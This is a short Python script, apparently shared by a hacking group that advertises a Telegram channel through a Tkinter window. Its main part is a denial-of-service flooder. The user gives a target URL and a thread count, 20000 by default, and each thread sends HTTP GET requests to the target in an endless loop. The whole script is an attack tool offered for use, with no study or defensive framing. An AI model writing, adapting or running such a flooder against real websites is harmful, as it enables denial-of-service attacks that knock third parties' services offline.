import time
import click
import colorama
from colorama import Fore
import threading
import requests
import tkinter
from tkinter import *
from tkinter import ttk
colorama.init()
print(Fore.CYAN + "P" + Fore.RED + "e" + Fore.GREEN + "s" + Fore.BLUE + "h")
print(Fore.CYAN + "H" + Fore.RED + "a" + Fore.GREEN + "c" + Fore.BLUE + "k")
print(Fore.CYAN + "T" + Fore.RED + "e" + Fore.GREEN + "a" + Fore.BLUE + "m")
root = Tk()
root.title("Пещера хакера")
root.geometry("640x640")
root.resizable(width=False, height=False)

btn = Button(root, text="do not forget to subscribe to telegram: @peshhack, there you will see a lot of interesting things", bg="black", fg="lime", font=('Comic Sans MS', 10, 'bold'))
btn.place(relx=0.5, rely=0.5, anchor=CENTER)

root.mainloop()

def dos(target):
    while True:
        try:
            res = requests.get(target)
            print(colorama.Fore.GREEN + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")
threads = 20000
url = input("Target URL(Ссылка на сайт): ")
try:
    threads = int(input("Threads(Потоки): "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("Please, input URL only through http or https.")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")